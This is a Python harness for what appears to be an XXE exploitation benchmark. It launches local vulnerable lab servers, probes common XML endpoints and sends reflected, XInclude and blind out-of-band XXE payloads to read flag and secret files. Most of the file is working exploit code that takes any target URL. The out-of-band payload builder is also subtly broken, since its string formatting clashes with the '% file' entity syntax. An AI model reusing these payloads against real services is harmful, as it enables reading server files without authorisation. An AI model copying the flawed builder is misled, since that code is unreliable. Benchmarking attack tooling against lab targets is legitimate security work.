#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""XXE 利用基准 —— Python 侧独立复刻（双语言机验）。

与 Go 侧 xxe_attack.go 完全独立实现：自己构造 XXE payload（回显型 /
XInclude / 参数实体 OOB），自己发现端点、自己投递、自己抽 flag（含
从 /oob-log 外带通道取回），最后与 xxe_benchmark.json 里的 SHA-256 比对。

纯标准库，不依赖任何第三方包。
"""
import hashlib
import json
import os
import re
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
RANGE_PY = os.path.join(HERE, "live_target", "xxe_range.py")
BENCH = os.path.join(HERE, "xxe_benchmark.json")
PY = sys.executable

FLAG_RE = re.compile(rb"[A-Za-z0-9_]{2,20}\{[^}\s\x00-\x1f\x7f]{4,}\}")

FILES = ["flag.txt", "flag", "/flag.txt", "/flag", "secret.txt"]

COMMON_ENDPOINTS = [
    "/parse", "/xml", "/api/xml", "/import", "/api/import", "/api/parse",
    "/parse-xml", "/xmlparser", "/api/xmlparse", "/notes", "/upload", "/data",
]

PATH_RE = re.compile(r"/[A-Za-z0-9_\-./]*\.(?:php|asp|aspx|jsp|py|html?|json|txt|action|do|cgi)\b"
                     r"|/(?:[A-Za-z0-9_\-]+/)+[A-Za-z0-9_\-]+"
                     r"|/(?:login|admin|index|cmd|fetch|page|search|profile|upload|api|xml)\b[A-Za-z0-9_\-./]*")


def sh(s):
    return hashlib.sha256(s.encode()).hexdigest()


def parse_endpoints(desc):
    out, seen = [], set()

    def add(p):
        if p and p not in seen:
            seen.add(p)
            out.append(p)

    for m in PATH_RE.findall(desc or ""):
        add(m)
    for p in COMMON_ENDPOINTS:
        add(p)
    return out


# ---------------- payload 构造（与 Go 侧独立实现，形态一致） ----------------

def payload_reflected(f):
    return ('<?xml version="1.0"?>'
            '<!DOCTYPE r [<!ENTITY xxe SYSTEM "%s">]>'
            "<r>&xxe;</r>" % f).encode()


def payload_xinclude(f):
    return ('<?xml version="1.0"?>'
            '<r xmlns:xi="http://www.w3.org/2001/XInclude">'
            '<xi:include href="%s" parse="text"/></r>' % f).encode()


def payload_oob(exfil_base, f):
    return ('<?xml version="1.0"?>'
            '<!DOCTYPE r ['
            '<!ENTITY % file SYSTEM "%s">'
            '<!ENTITY % oob SYSTEM "%s/oob?d=%%file;">'
            "%%oob;]> <r>x</r>") % (f, exfil_base)


def scan(body):
    if not body:
        return []
    return [m.decode("utf-8", "replace") for m in FLAG_RE.findall(body)]


# ---------------- HTTP ----------------

def req(url, data=None, headers=None, timeout=6):
    r = urllib.request.Request(url, data=data, headers=headers or {})
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return resp.status, resp.read()
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read()
        except Exception:  # noqa: BLE001
            return e.code, b""
    except Exception:  # noqa: BLE001
        return 0, b""


def attack(base, desc, deadline):
    eps = parse_endpoints(desc)
    live = []
    for ep in eps:
        if time.time() > deadline:
            break
        code, _ = req(base + ep, timeout=3)
        if code in (0, 404):
            continue
        live.append(ep)

    found = []
    for ep in live:
        if time.time() > deadline or found:
            break
        u = base + ep
        # 1) 回显型 / XInclude，两种 Content-Type
        for f in FILES:
            if time.time() > deadline or found:
                break
            for ct in ("application/xml", "text/xml"):
                for p in (payload_reflected(f), payload_xinclude(f)):
                    _, b = req(u, data=p, headers={"Content-Type": ct})
                    found += scan(b)
                    if found:
                        break
                if found:
                    break
        if found:
            break
        # 2) Blind XXE 参数实体外带：从 /oob-log 取回
        for f in FILES:
            if time.time() > deadline or found:
                break
            body = payload_oob(base, f).encode()
            code, _ = req(u, data=body, headers={"Content-Type": "application/xml"})
            if code == 0:
                continue
            time.sleep(0.3)
            _, log = req(base + "/oob-log", timeout=5)
            found += scan(log)
    out, seen = [], set()
    for x in found:
        if x not in seen:
            seen.add(x)
            out.append(x)
    return out


def wait_ready(port, timeout=12):
    end = time.time() + timeout
    while time.time() < end:
        code, _ = req("http://127.0.0.1:%d/" % port, timeout=1)
        if code:
            return True
        time.sleep(0.1)
    return False


def main():
    if not os.path.exists(BENCH) or not os.path.exists(RANGE_PY):
        print("基准集或靶场缺失，跳过"); sys.exit(0)
    doc = json.load(open(BENCH, encoding="utf-8"))["problems"]

    port = 18191
    hit = 0
    for pid in sorted(doc):
        p = subprocess.Popen([PY, RANGE_PY, str(port), pid],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        try:
            if not wait_ready(port):
                print("  ❌ %-14s 靶场未就绪" % pid); port += 1; continue
            base = "http://127.0.0.1:%d" % port
            got = attack(base, doc[pid]["description"], time.time() + 60)
            want = doc[pid]["flag_sha256"]
            ok = any(sh(x) == want for x in got)
            print("  %s %-14s 命中=%d %s" % ("✅" if ok else "❌", pid, len(got),
                                             "SHA-256 校验通过" if ok else got[:2]))
            hit += 1 if ok else 0
        finally:
            p.kill()
            port += 1
    print("XXE 基准（Python 侧）：%d/%d" % (hit, len(doc)))
    sys.exit(0 if hit == len(doc) else 1)


if __name__ == "__main__":
    main()
